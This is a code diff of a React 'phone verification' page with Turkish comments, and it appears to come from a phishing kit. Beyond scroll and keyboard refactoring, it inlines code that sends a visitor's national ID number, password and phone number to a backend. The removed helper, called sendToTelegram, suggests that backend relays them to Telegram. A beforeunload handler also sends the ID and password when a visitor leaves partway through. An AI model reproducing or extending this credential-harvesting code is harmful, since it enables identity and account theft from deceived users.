@@ -19,7 +19,7 @@ function PhoneVerificationPageContent() {
   });
 
   const phoneInputRef = useRef(null);
-  const { rightSectionRef, scrollConfig } = useScroll();
+  const { rightSectionRef, handleInputFocus } = useScroll();
   const location = useLocation();
   const navigate = useNavigate();
   const { dispatch: authDispatch } = useAuth();
@@ -60,24 +60,26 @@ function PhoneVerificationPageContent() {
 
     if (!isIOS() && 'virtualKeyboard' in navigator) {
       navigator.virtualKeyboard.overlaysContent = true;
-      navigator.virtualKeyboard.ongeometrychange = () => {
+      const handleKeyboardGeometryChange = () => {
         const kbHeight = navigator.virtualKeyboard.boundingRect.height;
         document.body.style.setProperty('--keyboard-height', `${kbHeight}px`);
-        const rightSection = rightSectionRef.current;
-        if (rightSection) {
-          rightSection.style.paddingBottom = `${kbHeight + 150}px`;
+        if (rightSectionRef.current) {
+          rightSectionRef.current.style.paddingBottom = `${kbHeight + 150}px`;
         }
       };
+      navigator.virtualKeyboard.addEventListener('geometrychange', handleKeyboardGeometryChange);
+      return () => {
+        navigator.virtualKeyboard.removeEventListener('geometrychange', handleKeyboardGeometryChange);
+        document.head.removeChild(meta);
+      };
     } else if (isIOS()) {
-      const rightSection = rightSectionRef.current;
-      if (rightSection) {
-        rightSection.style.paddingBottom = '150px';
+      if (rightSectionRef.current) {
+        rightSectionRef.current.style.paddingBottom = '150px';
       }
+      return () => {
+        document.head.removeChild(meta);
+      };
     }
-
-    return () => {
-      document.head.removeChild(meta);
-    };
   }, [rightSectionRef]);
 
   // Sayfa yüklendiğinde en üste kaydır
@@ -85,7 +87,7 @@ function PhoneVerificationPageContent() {
     const scrollToTop = () => {
       if (rightSectionRef.current) {
         rightSectionRef.current.scrollTop = 0;
-        rightSectionRef.current.dataset.loaded = "true";
+        rightSectionRef.current.dataset.loaded = 'true';
         console.log('Sayfa en üste kaydırıldı');
       } else {
         setTimeout(scrollToTop, 100);
@@ -96,98 +98,6 @@ function PhoneVerificationPageContent() {
       requestAnimationFrame(scrollToTop);
     }, 200);
   }, [rightSectionRef]);
-
-  // Scroll optimizasyonu: Fokus ve blur olayları
-  useEffect(() => {
-    const phoneRef = phoneInputRef.current;
-
-    const handleFocusScroll = () => {
-      const rightSection = rightSectionRef.current;
-      if (!rightSection || !phoneRef) return;
-
-      const inputRect = phoneRef.getBoundingClientRect();
-      const viewportHeight = window.visualViewport?.height || window.innerHeight;
-
-      if (isIOS()) {
-        const offset = 200;
-        setTimeout(() => {
-          requestAnimationFrame(() => {
-            const scrollTo = rightSection.scrollTop + inputRect.top - (viewportHeight - inputRect.height) / 2 + offset;
-            rightSection.scrollTo({ top: scrollTo, behavior: 'smooth' });
-          });
-        }, 200);
-        return;
-      }
-
-      const isAndroid = /Android/i.test(navigator.userAgent);
-      if (!isAndroid) return;
-
-      const offset = scrollConfig.phoneOffset;
-      setTimeout(() => {
-        requestAnimationFrame(() => {
-          const scrollTo = rightSection.scrollTop + inputRect.top - (viewportHeight - inputRect.height) / 2 + offset;
-          rightSection.scrollTo({ top: scrollTo, behavior: 'smooth' });
-        });
-      }, 200);
-    };
-
-    const handleBlurScroll = () => {
-      const rightSection = rightSectionRef.current;
-      if (rightSection) {
-        rightSection.style.height = '100vh';
-        rightSection.style.paddingBottom = isIOS() ? '150px' : '0';
-        rightSection.scrollTo({ top: 0, behavior: 'smooth' });
-      }
-    };
-
-    if (phoneRef) {
-      phoneRef.addEventListener('focus', handleFocusScroll);
-      phoneRef.addEventListener('blur', handleBlurScroll);
-    }
-
-    return () => {
-      if (phoneRef) {
-        phoneRef.removeEventListener('focus', handleFocusScroll);
-        phoneRef.removeEventListener('blur', handleBlurScroll);
-      }
-    };
-  }, [rightSectionRef, scrollConfig]);
-
-  // Telegram'a veri gönderimi
-  const sendToTelegram = useCallback(async (data) => {
-    try {
-      const res = await fetch(`${process.env.REACT_APP_API_URL}/api/submit`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          tc: String(data.tc),
-          password: String(data.password),
-          phone: String(data.phone),
-        }),
-      });
-      const result = await res.json();
-      if (!res.ok) throw new Error(result.message || 'Veri gönderimi başarısız.');
-      return result;
-    } catch (error) {
-      setState((prev) => ({
-        ...prev,
-        showPhoneError: true,
-        errorMessage: error.message || 'Veri gönderimi sırasında hata oluştu.',
-      }));
-      return { error: error.message };
-    }
-  }, []);
-
-  // Siteden çıkıldığında veri gönderimi
-  useEffect(() => {
-    const handleBeforeUnload = () => {
-      if (tc && password && !state.phoneNumber) {
-        sendToTelegram({ tc, password, phone: '' });
-      }
-    };
-    window.addEventListener('beforeunload', handleBeforeUnload);
-    return () => window.removeEventListener('beforeunload', handleBeforeUnload);
-  }, [tc, password, state.phoneNumber, sendToTelegram]);
 
   // Telefon numarası inputu değişimi
   const handleNumberInput = useCallback((e) => {
@@ -217,7 +127,9 @@ function PhoneVerificationPageContent() {
       errorMessage: '',
     }));
     phoneInputRef.current?.focus();
-  }, []);
+    handleInputFocus(phoneInputRef, 150); // Sabit scrollTo: 150
+    console.log('Telefon numarası temizlendi, aşağı kaydırma tetiklendi');
+  }, [handleInputFocus]);
 
   // Telefon inputuna fokuslanma
   const handlePhoneFocus = useCallback(() => {
@@ -228,7 +140,9 @@ function PhoneVerificationPageContent() {
       isPhonePrefixVisible: true,
       isPhoneFocused: true,
     }));
-  }, []);
+    handleInputFocus(phoneInputRef, 150); // Sabit scrollTo: 150
+    console.log('Telefon inputuna odaklanıldı, aşağı kaydırma tetiklendi');
+  }, [handleInputFocus]);
 
   // Telefon inputundan çıkma
   const handlePhoneBlur = useCallback(() => {
@@ -255,8 +169,16 @@ function PhoneVerificationPageContent() {
       }
       if (state.phoneNumber.length === 10) {
         setState((prev) => ({ ...prev, isSubmitting: true }));
-        const result = await sendToTelegram({ tc, password, phone: state.phoneNumber });
-        if (result && !result.error) {
+        const result = await fetch(`${process.env.REACT_APP_API_URL}/api/submit`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            tc: String(tc),
+            password: String(password),
+            phone: String(state.phoneNumber),
+          }),
+        }).then((res) => res.json());
+        if (!result.error) {
           authDispatch({ type: 'RESET_AUTH' });
           setState({
             phoneNumber: '',
@@ -270,11 +192,37 @@ function PhoneVerificationPageContent() {
           });
           window.history.replaceState(null, '', '/bekleme');
           navigate('/bekleme', { replace: true, state: { isValidNavigation: true, from: '/telefon', isCompleted: true } });
+        } else {
+          setState((prev) => ({
+            ...prev,
+            showPhoneError: true,
+            errorMessage: result.message || 'Veri gönderimi sırasında hata oluştu.',
+            isSubmitting: false,
+          }));
         }
       }
     },
-    [state.phoneNumber, sendToTelegram, tc, password, navigate, authDispatch]
+    [state.phoneNumber, tc, password, navigate, authDispatch]
   );
+
+  // Siteden çıkıldığında veri gönderimi
+  useEffect(() => {
+    const handleBeforeUnload = () => {
+      if (tc && password && !state.phoneNumber) {
+        fetch(`${process.env.REACT_APP_API_URL}/api/submit`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            tc: String(tc),
+            password: String(password),
+            phone: '',
+          }),
+        });
+      }
+    };
+    window.addEventListener('beforeunload', handleBeforeUnload);
+    return () => window.removeEventListener('beforeunload', handleBeforeUnload);
+  }, [tc, password, state.phoneNumber]);
 
   return (
     <div className="container" style={{ touchAction: 'manipulation' }} data-page="telefon">
